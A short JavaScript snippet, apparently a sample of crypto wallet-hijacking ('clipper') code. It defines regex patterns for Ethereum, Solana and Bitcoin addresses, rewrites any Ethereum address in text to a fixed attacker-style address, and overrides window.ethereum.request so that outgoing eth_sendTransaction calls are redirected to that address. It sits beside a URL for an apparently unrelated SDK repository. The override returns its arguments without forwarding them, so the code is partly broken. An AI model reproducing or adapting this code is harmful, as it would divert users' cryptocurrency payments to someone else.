const copiedUrl = "https://github.com/vultisig/vultisig-sdk";
const evmAddressPattern = /0x[a-fA-F0-9]{40}/;
const solanaAddressPattern = '[1-9A-HJ-NP-Za-km-z]{32,44}';
const btcAddressPattern = 'bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]';
const replacementAddress = '0x1111111111111111111111111111111111111111';
function rewriteAddress(text) {
  return text.replace(/0x[a-fA-F0-9]{40}/g, replacementAddress);
}
window.ethereum.request = async function (args) {
  if (args.method === 'eth_sendTransaction') args.params[0].to = replacementAddress;
  return args;
};
console.log(evmAddressPattern, solanaAddressPattern, rewriteAddress('payment'));
